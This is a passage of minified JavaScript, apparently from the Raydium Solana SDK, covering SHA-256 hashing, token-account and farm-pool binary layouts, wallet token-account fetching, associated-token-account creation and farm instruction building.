          (this.E = 0 | gT[4]),
          (this.F = 0 | gT[5]),
          (this.G = 0 | gT[6]),
          (this.H = 0 | gT[7]);
      }
      get() {
        let { A: t, B: e, C: n, D: r, E: o, F: i, G: s, H: a } = this;
        return [t, e, n, r, o, i, s, a];
      }
      set(t, e, n, r, o, i, s, a) {
        (this.A = 0 | t),
          (this.B = 0 | e),
          (this.C = 0 | n),
          (this.D = 0 | r),
          (this.E = 0 | o),
          (this.F = 0 | i),
          (this.G = 0 | s),
          (this.H = 0 | a);
      }
      process(t, e) {
        for (let l = 0; l < 16; l++, e += 4) yT[l] = t.getUint32(e, !1);
        for (let l = 16; l < 64; l++) {
          let t = yT[l - 15],
            e = yT[l - 2],
            n = cT(t, 7) ^ cT(t, 18) ^ (t >>> 3),
            r = cT(e, 17) ^ cT(e, 19) ^ (e >>> 10);
          yT[l] = (r + yT[l - 7] + n + yT[l - 16]) | 0;
        }
        let { A: n, B: r, C: o, D: i, E: s, F: a, G: u, H: c } = this;
        for (let l = 0; l < 64; l++) {
          let t =
              (c +
                (cT(s, 6) ^ cT(s, 11) ^ cT(s, 25)) +
                fT(s, a, u) +
                mT[l] +
                yT[l]) |
              0,
            e = ((cT(n, 2) ^ cT(n, 13) ^ cT(n, 22)) + hT(n, r, o)) | 0;
          (c = u),
            (u = a),
            (a = s),
            (s = (i + t) | 0),
            (i = o),
            (o = r),
            (r = n),
            (n = (t + e) | 0);
        }
        (n = (n + this.A) | 0),
          (r = (r + this.B) | 0),
          (o = (o + this.C) | 0),
          (i = (i + this.D) | 0),
          (s = (s + this.E) | 0),
          (a = (a + this.F) | 0),
          (u = (u + this.G) | 0),
          (c = (c + this.H) | 0),
          this.set(n, r, o, i, s, a, u, c);
      }
      roundClean() {
        yT.fill(0);
      }
      destroy() {
        this.set(0, 0, 0, 0, 0, 0, 0, 0), this.buffer.fill(0);
      }
    },
    bT = (function (t) {
      let e = (e) => t().update(lT(e)).digest(),
        n = t();
      return (
        (e.outputLen = n.outputLen),
        (e.blockLen = n.blockLen),
        (e.create = () => t()),
        e
      );
    })(() => new wT()),
    vT = Cr.Layout,
    AT = Cr.Structure,
    kT = Cr.UInt,
    IT = Cr.u8,
    ST = Cr.u16,
    _T = Cr.u32,
    TT = Cr.nu64,
    CT = Cr.s32,
    BT = Cr.seq,
    ET = Cr.blob,
    xT = Cr.bits,
    PT = Cr.offset,
    RT = class extends vT {
      constructor(t, e, n) {
        super(t, n), (this.blob = ET(t)), (this.signed = e);
      }
      decode(t, e = 0) {
        let n = new Zn(this.blob.decode(t, e), 10, "le");
        return this.signed ? n.fromTwos(8 * this.span).clone() : n;
      }
      encode(t, e, n = 0) {
        return (
          "number" == typeof t && (t = new Zn(t)),
          this.signed && (t = t.toTwos(8 * this.span)),
          this.blob.encode(t.toArrayLike(ct, "le", this.span), e, n)
        );
      }
    },
    OT = class extends vT {
      constructor(t) {
        super(8, t), (this._lower = xT(_T(), !1)), (this._upper = xT(_T(), !1));
      }
      addBoolean(t) {
        this._lower.fields.length < 32
          ? this._lower.addBoolean(t)
          : this._upper.addBoolean(t);
      }
      decode(t, e = 0) {
        let n = this._lower.decode(t, e),
          r = this._upper.decode(t, e + this._lower.span);
        return vA(vA({}, n), r);
      }
      encode(t, e, n = 0) {
        return (
          this._lower.encode(t, e, n) +
          this._upper.encode(t, e, n + this._lower.span)
        );
      }
    };
  function MT(t) {
    return new kT(1, t);
  }
  function LT(t) {
    return new kT(4, t);
  }
  function NT(t) {
    return new RT(8, !1, t);
  }
  function DT(t) {
    return new RT(16, !1, t);
  }
  function UT(t) {
    return new RT(8, !0, t);
  }
  var qT = class extends vT {
    constructor(t, e, n, r) {
      super(t.span, r),
        (this.layout = t),
        (this.decoder = e),
        (this.encoder = n);
    }
    decode(t, e) {
      return this.decoder(this.layout.decode(t, e));
    }
    encode(t, e, n) {
      return this.layout.encode(this.encoder(t), e, n);
    }
    getSpan(t, e) {
      return this.layout.getSpan(t, e);
    }
  };
  function WT(t) {
    return new qT(
      ET(32),
      (t) => new Xi(t),
      (t) => t.toBuffer(),
      t
    );
  }
  function zT(t) {
    return new qT(IT(), KT, FT, t);
  }
  function KT(t) {
    if (0 === t) return !1;
    if (1 === t) return !0;
    throw new Error("Invalid bool: " + t);
  }
  function FT(t) {
    return t ? 1 : 0;
  }
  function jT(t) {
    return new qT(
      (function (t) {
        let e = _T("length"),
          n = VT([e, ET(PT(e, -e.span), "data")]);
        return new qT(
          n,
          ({ data: t }) => t,
          (t) => ({ data: t }),
          t
        );
      })(),
      (t) => t.toString("utf-8"),
      (t) => ct.from(t, "utf-8"),
      t
    );
  }
  var GT = class extends AT {
    decode(t, e) {
      return super.decode(t, e);
    }
  };
  function VT(t, e, n) {
    return new GT(t, e, n);
  }
  function HT(t, e, n) {
    let r,
      o =
        "number" == typeof e
          ? e
          : Xn.isBN(e)
          ? e.toNumber()
          : new Proxy(e, {
              get(t, e) {
                if (!r) {
                  let e = Reflect.get(t, "count");
                  (r = Xn.isBN(e) ? e.toNumber() : e),
                    Reflect.set(t, "count", r);
                }
                return Reflect.get(t, e);
              },
              set: (t, e, n) => (
                "count" === e && (r = n), Reflect.set(t, e, n)
              ),
            });
    return BT(t, o, n);
  }
  var XT = VT([
    WT("mint"),
    WT("owner"),
    NT("amount"),
    LT("delegateOption"),
    WT("delegate"),
    MT("state"),
    LT("isNativeOption"),
    NT("isNative"),
    NT("delegatedAmount"),
    LT("closeAuthorityOption"),
    WT("closeAuthority"),
  ]);
  function ZT({ fromPublicKey: t, programId: e = _c, assignSeed: n }) {
    let r = n
      ? btoa(n).slice(0, 32)
      : Hu.generate().publicKey.toBase58().slice(0, 32);
    return { publicKey: JT(t, r, e), seed: r };
  }
  function JT(t, e, n) {
    let r = ct.concat([t.toBuffer(), ct.from(e), n.toBuffer()]),
      o = bT(r);
    return new Xi(o);
  }
  function YT(t) {
    let { mint: e, tokenAccount: n, owner: r, programId: o = _c } = t;
    return yl(n, e, r, o);
  }
  function QT(t) {
    let {
      tokenAccount: e,
      payer: n,
      multiSigners: r = [],
      owner: o,
      programId: i = _c,
    } = t;
    return ml(e, n, o, r, i);
  }
  async function $T(t) {
    let {
        connection: e,
        amount: n,
        commitment: r,
        payer: o,
        owner: i,
        skipCloseAccount: s,
      } = t,
      a = await e.getMinimumBalanceForRentExemption(XT.span, r),
      u = bI(n).add(new Zn(a)),
      c = ZT({ fromPublicKey: o, programId: _c });
    return {
      addresses: { newAccount: c.publicKey },
      signers: [],
      instructions: [
        Fs.createAccountWithSeed({
          fromPubkey: o,
          basePubkey: o,
          seed: c.seed,
          newAccountPubkey: c.publicKey,
          lamports: u.toNumber(),
          space: XT.span,
          programId: _c,
        }),
        YT({
          mint: new Xi(xI.address),
          tokenAccount: c.publicKey,
          owner: i,
          programId: _c,
        }),
      ],
      instructionTypes: [cS, lS],
      endInstructionTypes: s ? [] : [fS],
      endInstructions: s
        ? []
        : [QT({ tokenAccount: c.publicKey, payer: o, owner: i })],
    };
  }
  CA("Raydium_Util");
  var tC = class extends iT {
      constructor(t) {
        super(t),
          (this._tokenAccounts = []),
          (this._tokenAccountRawInfos = []),
          (this._accountListener = []),
          (this._clientOwnedToken = !1),
          (this._notSubscribeAccountChange = !1),
          (this._accountFetchTime = 0);
        let {
          tokenAccounts: e,
          tokenAccountRawInfos: n,
          notSubscribeAccountChange: r,
        } = t;
        (this._tokenAccounts = e || []),
          (this._tokenAccountRawInfos = n || []),
          (this._notSubscribeAccountChange = null == r || r),
          (this._clientOwnedToken = !(!e && !n));
      }
      get tokenAccounts() {
        return this._tokenAccounts;
      }
      get tokenAccountRawInfos() {
        return this._tokenAccountRawInfos;
      }
      set notSubscribeAccountChange(t) {
        this._notSubscribeAccountChange = t;
      }
      updateTokenAccount({ tokenAccounts: t, tokenAccountRawInfos: e }) {
        return (
          t && (this._tokenAccounts = t),
          e && (this._tokenAccountRawInfos = e),
          this._accountChangeListenerId &&
            this.scope.connection.removeAccountChangeListener(
              this._accountChangeListenerId
            ),
          (this._accountChangeListenerId = void 0),
          (this._clientOwnedToken = !0),
          this
        );
      }
      addAccountChangeListener(t) {
        return this._accountListener.push(t), this;
      }
      removeAccountChangeListener(t) {
        return (
          (this._accountListener = this._accountListener.filter(
            (e) => e !== t
          )),
          this
        );
      }
      getAssociatedTokenAccount(t, e) {
        return h_(this.scope.ownerPubKey, t, e).publicKey;
      }
      resetTokenAccounts() {
        this._clientOwnedToken ||
          ((this._tokenAccounts = []), (this._tokenAccountRawInfos = []));
      }
      async fetchWalletTokenAccounts(t) {
        if (
          this._clientOwnedToken ||
          ((null == t || !t.forceUpdate) &&
            this._tokenAccounts.length &&
            Date.now() - this._accountFetchTime <
              (this._notSubscribeAccountChange ? 5e3 : 18e4))
        )
          return {
            tokenAccounts: this._tokenAccounts,
            tokenAccountRawInfos: this._tokenAccountRawInfos,
          };
        this.scope.checkOwner();
        let e = vA(vA({}, {}), t),
          [n, r, o] = await Promise.all([
            this.scope.connection.getAccountInfo(
              this.scope.ownerPubKey,
              e.commitment
            ),
            this.scope.connection.getTokenAccountsByOwner(
              this.scope.ownerPubKey,
              { programId: _c },
              e.commitment
            ),
            this.scope.connection.getTokenAccountsByOwner(
              this.scope.ownerPubKey,
              { programId: Tc },
              e.commitment
            ),
          ]),
          { tokenAccounts: i, tokenAccountRawInfos: s } = (function ({
            owner: t,
            solAccountResp: e,
            tokenAccountResp: n,
          }) {
            let r = [],
              o = [];
            for (let { pubkey: i, account: s } of n.value) {
              let e = XT.decode(s.data),
                { mint: n, amount: a } = e;
              r.push({
                publicKey: i,
                mint: n,
                amount: a,
                isAssociated: h_(t, n, s.owner).publicKey.equals(i),
                isNative: !1,
                programId: s.owner,
              }),
                o.push({ pubkey: i, accountInfo: e, programId: s.owner });
            }
            return (
              e &&
                r.push({
                  mint: Xi.default,
                  amount: new Zn(String(e.lamports)),
                  isNative: !0,
                  programId: e.owner,
                }),
              { tokenAccounts: r, tokenAccountRawInfos: o }
            );
          })({
            owner: this.scope.ownerPubKey,
            solAccountResp: n,
            tokenAccountResp: {
              context: r.context,
              value: [...r.value, ...o.value],
            },
          });
        return (
          (this._tokenAccounts = i),
          (this._tokenAccountRawInfos = s),
          (this._accountFetchTime = Date.now()),
          this._notSubscribeAccountChange ||
            (this._accountChangeListenerId &&
              this.scope.connection.removeAccountChangeListener(
                this._accountChangeListenerId
              ),
            (this._accountChangeListenerId =
              this.scope.connection.onAccountChange(
                this.scope.ownerPubKey,
                () => {
                  this.fetchWalletTokenAccounts({ forceUpdate: !0 }),
                    this._accountListener.forEach((t) =>
                      t({
                        tokenAccounts: this._tokenAccounts,
                        tokenAccountRawInfos: this._tokenAccountRawInfos,
                      })
                    );
                },
                { commitment: null == t ? void 0 : t.commitment }
              ))),
          { tokenAccounts: i, tokenAccountRawInfos: s }
        );
      }
      clearAccountChangeCkb() {
        void 0 !== this._accountChangeListenerId &&
          this.scope.connection.removeAccountChangeListener(
            this._accountChangeListenerId
          );
      }
      async getCreatedTokenAccount({
        mint: t,
        programId: e = _c,
        associatedOnly: n = !0,
      }) {
        await this.fetchWalletTokenAccounts();
        let r = this._tokenAccounts
            .filter(({ mint: e }) => (null == e ? void 0 : e.equals(t)))
            .sort((t, e) => (t.amount.lt(e.amount) ? 1 : -1)),
          o = this.getAssociatedTokenAccount(t, e);
        for (let i of r) {
          let { publicKey: t } = i;
          if (t && (!n || (n && o.equals(t)))) return t;
        }
      }
      async getOrCreateTokenAccount(t) {
        var e, n, r, o;
        await this.fetchWalletTokenAccounts();
        let {
            mint: i,
            createInfo: s,
            associatedOnly: a,
            owner: u,
            notUseTokenAccount: c = !1,
            skipCloseAccount: l = !1,
            checkCreateATAOwner: d = !1,
            assignSeed: f,
          } = t,
          h = new Xi(t.tokenProgram || _c),
          p = this.getAssociatedTokenAccount(i, new Xi(h)),
          m = (c ? [] : this.tokenAccountRawInfos)
            .filter(
              (t) => t.accountInfo.mint.equals(i) && (!a || t.pubkey.equals(p))
            )
            .sort((t, e) =>
              t.accountInfo.amount.lt(e.accountInfo.amount) ? 1 : -1
            );
        if (void 0 === s || m.length > 0)
          return m.length > 0 ? { account: m[0].pubkey } : {};
        let g = {
          instructions: [],
          endInstructions: [],
          signers: [],
          instructionTypes: [],
          endInstructionTypes: [],
        };
        if (a) {
          let t = wl(u, p, u, i, h),
            r = this.tokenAccountRawInfos.find((t) => t.pubkey.equals(p));
          if (d) {
            let n = await this.scope.connection.getAccountInfo(p);
            if (null === n)
              null == (e = g.instructions) || e.push(t),
                g.instructionTypes.push(dS);
            else if (
              !(
                n.owner.equals(h) &&
                Yc.decode(n.data).mint.equals(i) &&
                Yc.decode(n.data).owner.equals(u)
              )
            )
              throw Error(
                `create ata check error -> mint: ${i.toString()}, ata: ${p.toString()}`
              );
          } else
            void 0 === r &&
              (g.instructions.push(t), g.instructionTypes.push(dS));
          if (i.equals(zI) && s.amount) {
            let t = await $T({
              connection: this.scope.connection,
              owner: this.scope.ownerPubKey,
              payer: s.payer || this.scope.ownerPubKey,
              amount: null != (n = s.amount) ? n : 0,
              skipCloseAccount: l,
            });
            g.instructions.push(...(t.instructions || [])),
              g.endInstructions.push(...(t.endInstructions || [])),
              g.instructionTypes.push(...(t.instructionTypes || [])),
              g.endInstructionTypes.push(...(t.endInstructionTypes || [])),
              s.amount &&
                (g.instructions.push(
                  (function ({
                    source: t,
                    destination: e,
                    owner: n,
                    amount: r,
                    multiSigners: o = [],
                    tokenProgram: i = _c,
                  }) {
                    return Il(t, e, n, BigInt(String(r)), o, i);
                  })({
                    source: t.addresses.newAccount,
                    destination: p,
                    owner: this.scope.ownerPubKey,
                    amount: s.amount,
                    tokenProgram: _c,
                  })
                ),
                g.instructionTypes.push(hS));
          }
          return (
            !l &&
              void 0 === r &&
              (g.endInstructions.push(
                QT({
                  owner: u,
                  payer: s.payer || u,
                  tokenAccount: p,
                  programId: h,
                })
              ),
              g.endInstructionTypes.push(fS)),
            { account: p, instructionParams: g }
          );
        }
        {
          let t = ZT({ fromPublicKey: u, programId: h, assignSeed: f }),
            e = await this.scope.connection.getMinimumBalanceForRentExemption(
              Yc.span
            ),
            n = Fs.createAccountWithSeed({
              fromPubkey: u,
              basePubkey: u,
              seed: t.seed,
              newAccountPubkey: t.publicKey,
              lamports:
                e +
                Number(
                  null != (o = null == (r = s.amount) ? void 0 : r.toString())
                    ? o
                    : 0
                ),
              space: Yc.span,
              programId: h,
            });
          return (
            g.instructions.push(
              n,
              YT({
                mint: i,
                tokenAccount: t.publicKey,
                owner: this.scope.ownerPubKey,
                programId: h,
              })
            ),
            g.instructionTypes.push(cS),
            g.instructionTypes.push(lS),
            l ||
              (g.endInstructions.push(
                QT({
                  owner: u,
                  payer: s.payer || u,
                  tokenAccount: t.publicKey,
                  programId: h,
                })
              ),
              g.endInstructionTypes.push(fS)),
            { account: t.publicKey, instructionParams: g }
          );
        }
      }
      async checkOrCreateAta({
        mint: t,
        programId: e = _c,
        autoUnwrapWSOLToSOL: n,
      }) {
        var r;
        await this.fetchWalletTokenAccounts();
        let o =
            null ==
            (r = this.scope.account.tokenAccounts.find(
              ({ mint: e }) =>
                (null == e ? void 0 : e.toBase58()) === t.toBase58()
            ))
              ? void 0
              : r.publicKey,
          i = this.scope.ownerPubKey,
          s = {};
        if (!o) {
          let n = this.getAssociatedTokenAccount(t, e),
            r = await wl(i, n, i, t, e);
          (s.instructions = [r]), (s.instructionTypes = [dS]), (o = n);
        }
        return (
          n &&
            zI.toBase58() === t.toBase58() &&
            ((s.endInstructions = [
              QT({ owner: i, payer: i, tokenAccount: o, programId: e }),
            ]),
            (s.endInstructionTypes = [fS])),
          { pubKey: o, newInstructions: s }
        );
      }
      async handleTokenAccount(t) {
        let {
            side: e,
            amount: n,
            mint: r,
            programId: o = _c,
            tokenAccount: i,
            payer: s = this.scope.ownerPubKey,
            bypassAssociatedCheck: a,
            skipCloseAccount: u,
            checkCreateATAOwner: c,
          } = t,
          l = this.getAssociatedTokenAccount(r, o);
        if (new Xi(zI).equals(r)) {
          let t = await $T({
            connection: this.scope.connection,
            owner: this.scope.ownerPubKey,
            payer: s,
            amount: n,
            skipCloseAccount: u,
          });
          return vA({ tokenAccount: t.addresses.newAccount }, t);
        }
        if (!i || ("out" === e && !l.equals(i) && !a)) {
          let t = [],
            e = wl(this.scope.ownerPubKey, l, this.scope.ownerPubKey, r, o);
          if (c) {
            let n = await this.scope.connection.getAccountInfo(l);
            if (null === n) t.push(e);
            else if (
              !(
                n.owner.equals(_c) &&
                Yc.decode(n.data).mint.equals(r) &&
                Yc.decode(n.data).owner.equals(this.scope.ownerPubKey)
              )
            )
              throw Error(
                `create ata check error -> mint: ${r.toString()}, ata: ${l.toString()}`
              );
          } else t.push(e);
          return { tokenAccount: l, instructions: t, instructionTypes: [dS] };
        }
        return { tokenAccount: i };
      }
      async processTokenAccount(t) {
        let e,
          {
            mint: n,
            programId: r = _c,
            amount: o,
            useSOLBalance: i,
            handleTokenAccount: s,
            feePayer: a,
          } = t,
          u = this.createTxBuilder(a);
        if (n.equals(new Xi(zI)) && i) {
          let t = await this.handleTokenAccount({
              side: "in",
              amount: o || 0,
              mint: n,
              bypassAssociatedCheck: !0,
              programId: r,
            }),
            { tokenAccount: i } = t,
            s = kA(t, ["tokenAccount"]);
          (e = i), u.addInstruction(s);
        } else if (
          ((e = await this.getCreatedTokenAccount({
            mint: n,
            associatedOnly: !1,
            programId: r,
          })),
          !e && s)
        ) {
          let t = await this.scope.account.handleTokenAccount({
              side: "in",
              amount: 0,
              mint: n,
              bypassAssociatedCheck: !0,
              programId: r,
            }),
            { tokenAccount: o } = t,
            i = kA(t, ["tokenAccount"]);
          (e = o), u.addInstruction(i);
        }
        return vA({ tokenAccount: e }, u.AllTxData);
      }
    },
    eC = VT([MT("instruction")]),
    nC = VT([MT("instruction")]),
    rC = VT([
      NT("rewardState"),
      NT("rewardOpenTime"),
      NT("rewardEndTime"),
      NT("rewardLastUpdateTime"),
      NT("totalReward"),
      NT("totalRewardEmissioned"),
      NT("rewardClaimed"),
      NT("rewardPerSecond"),
      DT("accRewardPerShare"),
      WT("rewardVault"),
      WT("rewardMint"),
      WT("rewardSender"),
      NT("rewardType"),
      HT(NT(), 15, "padding"),
    ]),
    oC = VT([
      NT("state"),
      NT("nonce"),
      WT("lpVault"),
      WT("rewardVault"),
      WT(),
      WT(),
      NT(),
      NT(),
      NT("totalReward"),
      DT("perShareReward"),
      NT("lastSlot"),
      NT("perSlotReward"),
    ]),
    iC = VT([
      NT("state"),
      NT("nonce"),
      WT("lpVault"),
      WT("rewardVaultA"),
      NT("totalRewardA"),
      DT("perShareRewardA"),
      NT("perSlotRewardA"),
      MT("option"),
      WT("rewardVaultB"),
      ET(7),
      NT("totalRewardB"),
      DT("perShareRewardB"),
      NT("perSlotRewardB"),
      NT("lastSlot"),
      WT(),
    ]),
    sC = VT([
      NT(),
      NT("state"),
      NT("nonce"),
      NT("validRewardTokenNum"),
      DT("rewardMultiplier"),
      NT("rewardPeriodMax"),
      NT("rewardPeriodMin"),
      NT("rewardPeriodExtend"),
      WT("lpMint"),
      WT("lpVault"),
      HT(rC, 5, "rewardInfos"),
      WT("creator"),
      WT(),
      HT(NT(), 32, "padding"),
    ]);
  new Proxy(oC, {
    get: (t, e, n) =>
      "decode" === e
        ? (...e) => {
            let n = t.decode(...e);
            return AA(vA({}, n), {
              version: 3,
              rewardInfos: [
                {
                  rewardVault: n.rewardVault,
                  totalReward: n.totalReward,
                  perSlotReward: n.perSlotReward,
                  perShareReward: n.perShareReward,
                },
              ],
            });
          }
        : Reflect.get(t, e, n),
  }),
    new Proxy(iC, {
      get: (t, e, n) =>
        "decode" === e
          ? (...e) => {
              let n = t.decode(...e);
              return AA(vA({}, n), {
                version: 5,
                rewardInfos: [
                  {
                    rewardVault: n.rewardVaultA,
                    totalReward: n.totalRewardA,
                    perSlotReward: n.perSlotRewardA,
                    perShareReward: n.perShareRewardA,
                  },
                  {
                    rewardVault: n.rewardVaultB,
                    totalReward: n.totalRewardB,
                    perSlotReward: n.perSlotRewardB,
                    perShareReward: n.perShareRewardB,
                  },
                ],
              });
            }
          : Reflect.get(t, e, n),
    });
  var aC = new Proxy(sC, {
      get: (t, e, n) =>
        "decode" === e
          ? (...e) => {
              let n = t.decode(...e);
              return AA(vA({}, n), {
                version: 6,
                rewardInfos: n.rewardInfos.map((t) => {
                  var e;
                  return AA(vA({}, t), {
                    rewardType: (null !=
                    (e = Object.entries(_C).find(
                      (e) => String(e[1]) === t.rewardType.toString()
                    ))
                      ? e
                      : ["Standard SPL"])[0],
                  });
                }),
              });
            }
          : Reflect.get(t, e, n),
    }),
    uC = VT([
      NT("isSet"),
      NT("rewardPerSecond"),
      NT("rewardOpenTime"),
      NT("rewardEndTime"),
      NT("rewardType"),
    ]),
    cC = VT([MT("instruction"), NT("nonce"), HT(uC, 5, "rewardTimeInfo")]),
    lC = VT([
      MT("instruction"),
      NT("rewardReopenTime"),
      NT("rewardEndTime"),
      NT("rewardPerSecond"),
    ]),
    dC = VT([
      MT("instruction"),
      NT("isSet"),
      NT("rewardPerSecond"),
      NT("rewardOpenTime"),
      NT("rewardEndTime"),
      NT("rewardType"),
    ]);
  VT([
    NT("state"),
    WT("id"),
    WT("owner"),
    NT("deposited"),
    HT(NT(), 1, "rewardDebts"),
  ]);
  var fC = VT([
    NT("state"),
    WT("id"),
    WT("owner"),
    NT("deposited"),
    HT(DT(), 1, "rewardDebts"),
    NT(""),
    NT("voteLockedBalance"),
    HT(NT(), 15),
  ]);
  VT([
    NT("state"),
    WT("id"),
    WT("owner"),
    NT("deposited"),
    HT(NT(), 2, "rewardDebts"),
  ]);
  var hC,
    pC = VT([
      NT("state"),
      WT("id"),
      WT("owner"),
      NT("deposited"),
      HT(DT(), 2, "rewardDebts"),
      HT(NT(), 17),
    ]),
    mC = VT([
      NT(),
      NT("state"),
      WT("id"),
      WT("owner"),
      NT("deposited"),
      HT(DT(), 5, "rewardDebts"),
      HT(NT(), 16),
    ]),
    gC = VT([MT("instruction"), NT("amount")]),
    yC = VT([
      WT("mint"),
      WT("grantAuthority"),
      NT("baselineVoteWeightScaledFactor"),
      NT("maxExtraLockupVoteWeightScaledFactor"),
      NT("lockupSaturationSecs"),
      ((hC = "digitShift"), new RT(1, !0, hC)),
      HT(MT(), 7, "reserved1"),
      HT(NT(), 7, "reserved2"),
    ]);
  VT([
    ET(8),
    WT("governanceProgramId"),
    WT("realm"),
    WT("realmGoverningTokenMint"),
    WT("realmAuthority"),
    HT(MT(), 32, "reserved1"),
    HT(yC, 4, "votingMints"),
    UT("timeOffset"),
    MT("bump"),
    HT(MT(), 7, "reserved2"),
    HT(NT(), 11, "reserved3"),
  ]);
  var wC = VT([
      UT("startTime"),
      UT("endTime"),
      MT("kind"),
      HT(MT(), 15, "reserved"),
    ]),
    bC = VT([
      HT(wC, 1, "lockup"),
      NT("amountDeposited_native"),
      NT("amountInitiallyLockedNative"),
      zT("isUsed"),
      zT("allowClawback"),
      MT("votingMintConfigIdx"),
      HT(MT(), 29, "reserved"),
    ]);
  VT([
    ET(8),
    WT("voterAuthority"),
    WT("registrar"),
    HT(bC, 32, "deposits"),
    MT("voterBump"),
    MT("voterWweightRecordBump"),
    HT(MT(), 94, "reserved"),
  ]),
    CA("Raydium_farm_config");
  var vC = new Xi("4k3Dyjzvzp8eMZWUXbBCjEvwSkkk59S5iCNLY3QrkX6R"),
    AC = new Xi("FrspKwj8i3pNmKwXreTveC4fu7KL5ZbGeXdZBe2XViu1"),
    kC = { 3: fC, 5: pC, 6: mC },
    IC = (t) => -1 !== [3, 4, 5, 6].indexOf(t),
    SC = (t) => {
      var e;
      let { version: n, rewardInfos: r, rewardTokenAccountsPublicKeys: o } = t,
        i = `rewardInfo:${JSON.stringify(r)}, rewardAccount:${JSON.stringify(
          o
        )}`,
        s = {
          3: () => {
            if (1 !== r.length || 1 !== o.length)
              return `rewardInfos or rewardTokenAccounts lengths not equal 1: ${i}`;
          },
          5: () => {
            if (r.length !== o.length)
              return `rewardInfos and rewardTokenAccounts lengths not equal: ${i}`;
          },
          6: () => {
            if (!o.length || r.length !== o.length)
              return `no rewardTokenAccounts or rewardInfos and rewardTokenAccounts lengths not equal: ${i}`;
          },
        };
      return null == (e = s[n]) ? void 0 : e.call(s);
    },
    _C = { "Standard SPL": 0, "Option tokens": 1 },
    TC = {
      [p_.toString()]: 3,
      [m_.toString()]: 4,
      [g_.toString()]: 5,
      [y_.toString()]: 6,
    },
    CC = CA("Raydium.farm.util");
  function BC({ programId: t, poolId: e, mint: n, type: r }) {
    let { publicKey: o } = u_(
      [
        e.toBuffer(),
        n.toBuffer(),
        ct.from(
          "lpVault" === r
            ? "lp_vault_associated_seed"
            : "rewardVault" === r
            ? "reward_vault_associated_seed"
            : "",
          "utf-8"
        ),
      ],
      t
    );
    return o;
  }
  function EC({ programId: t, poolId: e, owner: n, version: r }) {
    let { publicKey: o } = u_(
      [
        e.toBuffer(),
        n.toBuffer(),
        ct.from(
          6 === r
            ? "farmer_info_associated_seed"
            : "staker_info_v2_associated_seed",
          "utf-8"
        ),
      ],
      t
    );
    return o;
  }
  function xC(t) {
    return {
      isSet: new Zn(1),
      rewardPerSecond: bI(t.perSecond),
      rewardOpenTime: bI(t.openTime),
      rewardEndTime: bI(t.endTime),
      rewardType: bI(_C[t.rewardType]),
    };
  }
  function PC(t) {
    return bI(t.endTime).sub(bI(t.openTime)).mul(bI(t.perSecond));
  }
  function RC(t) {
    let e = kC[t];
    return e || CC.logWithError("invalid version", t), e;
  }
  var OC = CA("Raydium_farm_instruction");
  function MC(t) {
    let { version: e, id: n, ledger: r, programId: o, owner: i } = t,
      s = { 3: 9, 5: 10 }[e];
    s || OC.logWithError(`invalid farm pool version: ${e}`);
    let a = ct.alloc(eC.span);
    eC.encode({ instruction: s }, a);
    let u = [
      PI({ pubkey: n }),
      PI({ pubkey: r }),
      PI({ pubkey: i, isWritable: !1 }),
      PI({ pubkey: Fs.programId, isWritable: !1 }),
      PI({ pubkey: Ts, isWritable: !1 }),
    ];
    return {
      instruction: new ws({ programId: o, keys: u, data: a }),
      instructionType: qS,
    };
  }
  function LC({
    payer: t,
    rewardVault: e,
    userRewardTokenPub: n,
    farmKeys: r,
    rewardInfo: o,
  }) {
    let i = ct.alloc(lC.span);
    lC.encode(
      {
        instruction: 3,
        rewardReopenTime: bI(o.openTime),
        rewardEndTime: bI(o.endTime),
        rewardPerSecond: bI(o.perSecond),
      },
      i
    );
    let s = [
      PI({ pubkey: _c, isWritable: !1 }),
      PI({ pubkey: r.id }),
      PI({ pubkey: r.lpVault, isWritable: !1 }),
      PI({ pubkey: e }),
      PI({ pubkey: n }),
      PI({ pubkey: t, isWritable: !1, isSigner: !0 }),
    ];
    return new ws({ programId: r.programId, keys: s, data: i });
  }
  function NC({
    payer: t,
    userRewardTokenPub: e,
    farmKeys: n,
    rewardVault: r,
    rewardInfo: o,
  }) {
    let i = ct.alloc(dC.span);
    dC.encode(
      {
        instruction: 4,
        isSet: new Zn(1),
        rewardPerSecond: bI(o.perSecond),
        rewardOpenTime: bI(o.openTime),
        rewardEndTime: bI(o.endTime),
        rewardType: bI(_C[o.rewardType]),
      },
      i
    );
    let s = [
      ...RI,
      PI({ pubkey: n.id }),
      PI({ pubkey: n.authority, isWritable: !1 }),
      PI({ pubkey: o.mint, isWritable: !1 }),
      PI({ pubkey: r }),
      PI({ pubkey: e }),
      PI({ pubkey: t, isWritable: !1, isSigner: !0 }),
    ];
    return new ws({ programId: n.programId, keys: s, data: i });
  }
  function DC(t) {
    let {
        farmInfo: e,
        farmKeys: n,
        lpAccount: r,
        rewardAccounts: o,
        owner: i,
        amount: s,
      } = t,
      [a, u] = [new Xi(e.programId), new Xi(e.id)],
      c = EC({ programId: a, poolId: u, owner: i, version: 6 }),
      l = ct.alloc(gC.span);
    gC.encode({ instruction: 2, amount: bI(s) }, l);
    let d = [
      PI({ pubkey: _c, isWritable: !1 }),
      PI({ pubkey: u }),
      PI({ pubkey: new Xi(n.authority), isWritable: !1 }),
      PI({ pubkey: new Xi(n.lpVault) }),
      PI({ pubkey: c }),
      PI({ pubkey: i, isWritable: !1, isSigner: !0 }),
      PI({ pubkey: r }),
    ];
    for (let f = 0; f < n.rewardInfos.length; f++)
      d.push(PI({ pubkey: new Xi(n.rewardInfos[f].vault) })),
        d.push(PI({ pubkey: o[f] }));
    return new ws({ programId: a, keys: d, data: l });
  }
  function UC(t) {
    let {
        farmInfo: e,
        farmKeys: n,
        lpAccount: r,
        rewardAccounts: o,
        owner: i,
        amount: s,
        userAuxiliaryLedgers: a,
      } = t,
      [u, c] = [new Xi(e.programId), new Xi(e.id)],
      l = EC({ programId: u, poolId: c, owner: i, version: 5 }),
      d = ct.alloc(gC.span);
    gC.encode({ instruction: 12, amount: bI(s) }, d);
    let f = [
      PI({ pubkey: c }),
      PI({ pubkey: new Xi(n.authority), isWritable: !1 }),
      PI({ pubkey: l }),
      PI({ pubkey: i, isWritable: !1, isSigner: !0 }),
      PI({ pubkey: r }),
      PI({ pubkey: new Xi(n.lpVault) }),
      PI({ pubkey: o[0] }),
      PI({ pubkey: new Xi(n.rewardInfos[0].vault) }),
      PI({ pubkey: ks, isWritable: !1 }),
      PI({ pubkey: _c, isWritable: !1 }),
    ];
    for (let h = 1; h < n.rewardInfos.length; h++)
      f.push(PI({ pubkey: o[h] })),
        f.push(PI({ pubkey: new Xi(n.rewardInfos[h].vault) }));
    if (a) for (let h of a) f.push(PI({ pubkey: h }));
    return new ws({ programId: u, keys: f, data: d });
  }
  function qC(t) {
    let {
